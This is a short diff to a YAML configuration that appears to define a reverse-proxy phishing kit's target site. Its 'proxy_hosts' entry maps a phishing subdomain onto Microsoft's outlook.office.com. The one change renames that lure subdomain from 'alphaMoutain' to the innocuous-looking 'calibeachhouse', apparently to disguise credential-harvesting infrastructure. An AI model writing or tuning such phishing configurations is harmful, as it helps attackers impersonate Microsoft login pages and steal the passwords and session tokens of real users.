@@ -335,7 +335,7 @@ proxy_hosts:
     }
   #
   - {
-      phish_sub: "alphaMoutain",
+      phish_sub: "calibeachhouse",
       orig_sub: "outlook",
       domain: "office.com",
       session: false,
